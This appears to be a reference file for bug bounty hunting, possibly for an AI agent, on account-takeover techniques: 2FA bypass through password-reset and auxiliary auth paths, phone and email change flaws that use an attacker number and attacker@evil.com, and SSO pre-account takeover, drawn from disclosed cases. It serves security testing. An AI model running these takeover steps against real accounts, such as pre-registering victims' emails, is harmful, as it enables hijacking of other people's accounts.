---
name: auth-recovery-ato-flows
description: auth-recovery-ato-flows reference material.
---

# Auth-Recovery / Account-Takeover Flow Abuse

Part of `skills/hunt-business-logic/SKILL.md`. Read this ONLY when the target has 2FA/MFA, a password-reset or account-recovery flow, a phone-number or email-change flow, or supports BOTH direct-login and SSO/OAuth for the same domain.

---

### Sub-technique D — 2FA / MFA bypass via auxiliary flow

```
# KhaledAhmed107 Jan 2026 — 2FA bypass via password reset
1. Create account, log in, enable 2FA via Google Authenticator
2. Log out
3. Navigate to Reset Password page
4. Open password reset link from email
5. When prompted for 2FA code, observe "Skip" option
6. Click Skip → set new password → redirected to dashboard, no 2FA required
# Pattern repeats across SaaS programs — always test password reset for 2FA enforcement

# Keycloak CVE-2025-3910 (GHSA-5jfq-x6xp-7rw2)
# org.keycloak.authorization circumvents required actions including 2FA setup
# Affects 26.0 through 26.0.10
# Fix: upgrade to 26.2.2+

# Samsung Account 2FA bypass (Gregory Greekas 2024)
# 2FA request API returned victim's IMEI to anyone with username
# Compute deviceUniqueId from IMEI (deterministic transformation)
# Submit auth request with computed deviceUniqueId → 2FA bypassed
# Patched Dec 2024
```

```bash
# Generic 2FA bypass test set for any account
# Test each path:
curl -X POST https://target/api/login -d '{"email":"...","password":"..."}'  # without 2FA token
curl -X POST https://target/oauth/authorize -d '...'                          # OAuth flow
curl -X POST https://target/api/auth/refresh -d '...'                          # token refresh
curl -X POST https://target/api/password-reset -d '...'                        # password reset
curl -X POST https://target/api/auth/sso -d '...'                              # SSO bypass
curl -X POST https://target/api/auth/recovery -d '...'                         # recovery flow
curl -X POST https://target/mobile/auth -d '...'                               # mobile app auth
# Any path that lands you authenticated without 2FA → bypass
```

### Sub-technique F — Phone / email change ownership bypass

```
# H1 2024 critical: Change phone number OTP flaw → any phone takeover
# Vulnerable flow: change-phone API sends OTP only to NEW number
POST /api/account/change-phone HTTP/1.1
Authorization: Bearer <victim-session-or-stolen-token>
{"new_phone": "+15555550100"}    # attacker-controlled number

# Server sends OTP to +15555550100 (attacker)
# Attacker submits OTP → victim's account now has attacker phone
# Reset password via SMS OTP → ATO

# Secure version requires OTP from BOTH old (+1victim) and new (+1attacker) numbers

# Email change variant
POST /api/account/change-email HTTP/1.1
{"new_email": "attacker@evil.com"}
# Server sends verification email only to attacker@evil.com
# Attacker confirms → victim's email is now attacker's → password reset → ATO
```

### Sub-technique H — Pre-Account Takeover via SSO / migration

```
# Giongnef Jan 2024 pattern (https://giongfnef.medium.com/business-logic-bypass-2fa-to-ato-e0dc7131b10e)
# Target supports both direct-login and SSO; sso_type:null defaults to direct-login

# Step 1: Attacker pre-registers victim's corporate email in Store DB
POST /api/signup
{
  "email": "victim@companyA.com",  # victim hasn't signed up yet
  "password": "Attacker123!",
  "sso_type": null                   # direct-login mode
}

# Step 2: Attacker logs in, uses "Migrate" function to transfer to SSO DB
POST /api/sso/migrate
Authorization: Bearer <attacker-session>

# Step 3: Wait for victim to register at sso.companyA.com (legitimate flow)
# Victim enters Google SSO with victim@companyA.com — succeeds because account already exists in SSO

# Step 4: Attacker still has direct-login access to victim's account because
# the password set in Step 1 is still valid for the migrated SSO account

# Result: persistent ATO that survives victim's "secure" SSO signup

# Generic test: any time a SaaS supports both direct-login AND SSO/OAuth,
# pre-register every interesting email-domain you can find before the legitimate
# user signs up.
```

